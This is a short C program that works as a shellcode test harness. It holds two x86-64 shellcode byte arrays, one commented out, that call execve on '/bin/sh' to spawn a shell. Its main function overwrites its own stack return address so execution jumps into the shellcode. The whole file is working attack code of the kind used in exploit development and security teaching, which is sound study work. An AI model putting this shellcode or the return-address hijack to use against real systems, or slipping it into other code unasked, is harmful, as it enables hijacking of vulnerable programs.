#include <stdio.h>

//unsigned char code[] = "\xeb\x28\x59\x55\x48\x89\xe5\x48\x83\xec\x30\x48\x89\x4d\xe0\x48\x31\xc0\x48\x89\x45\xe8\x48\x89\xc2\x48\x8d\x75\xe0\x48\x8b\x7d\xe0\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\xe8\xd3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

unsigned char code[] = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

void main(int argc, char *argv[])
{ 
    long *ret; 
    ret = (long *)&ret + 2;  
    (*ret) = (long)code;
}

